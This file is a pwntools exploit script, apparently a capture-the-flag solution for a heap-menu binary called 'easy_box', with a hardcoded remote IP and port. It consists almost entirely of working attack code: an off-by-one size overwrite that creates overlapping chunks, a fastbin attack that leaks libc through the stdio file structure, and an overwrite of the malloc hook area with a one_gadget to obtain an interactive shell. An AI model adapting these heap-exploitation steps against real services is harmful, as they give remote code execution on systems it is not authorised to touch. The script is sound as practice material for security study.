#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'easy_box'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "101.200.53.148"
remotePort = 34521

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(index, size, data):
	sla('>>>', str(1))
	sla(':', str(index));
	sla(':', str(size))
	sa(':', data)

def rm(idx):
	sla('>>>', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x68, 'A')
	ad(1, 0x68, 'B')
	ad(2, 0x68, 'C')
	ad(3, 0x68, 'D')

	# Overflow to write chunk 1 size make chunk 1 to merge chunk 2
	rm(0)
	ad(0, 0x68, '\x00' * 0x68 + p8(0xe1))

	rm(1) # free as small bin
	rm(2) # for fastbin attack

	ad(4, 0x28, '\x11' * 0x28)
	ad(5, 0x38, '\x22' * 0x38)
	ad(6, 0x10, '\xdd\x25')
	# recovery size
	rm(5)

	ad(5, 0x38, '\x22' * 0x38 + p8(0x71))
	ad(7, 0x68, '\x00')
	p = '\x00' * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0)
	ad(8, 0x68, p)
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base -= lib.sym['_IO_2_1_stderr_'] + 192
	lib.address = libc_base
	main_arena = libc_base + 0x3c4b20
	li('libc_base: ' + hex(libc_base))

	rm(7) # for fastbin attack to main_arena - 0x33

	# recovery size as 0x21
	rm(5)
	ad(5, 0x38, '\x22' * 0x38 + p8(0x21))
	rm(6)
	# modify fastbin list
	ad(6, 0x10, p64(main_arena - 0x33))
	
	# recovery size as 0x71
	rm(5)
	ad(0, 0x38, '\x22' * 0x38 + p8(0x71))
	ad(9, 0x68, 'A') # for ajust
	# attack to main_arena - 0x33
	realloc = lib.sym['realloc']
	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8]
	one_gadget = lib.address + gadgets[2]
	p = '\xAA' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc + 8)

	ad(10, 0x68, p)
	

	sla('>>>', str(1))
	sla(':', str(11));
	sla(':', str(0x10))

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	for i in range(100):
		try:
			if LOCAL:
				exe = ELF(exeFile)
				if LIB:
					lib = ELF(libFile)
					io = exe.process(env = {"LD_PRELOAD" : libFile})
				else:
					io = exe.process()

				break
			
			else:
				exe = ELF(exeFile)
				io = remote(remoteIp, remotePort)
				if LIB:
					lib = ELF(libFile)
			exploit()
			finish()
		except:
			c()
	
	exploit()
	finish()
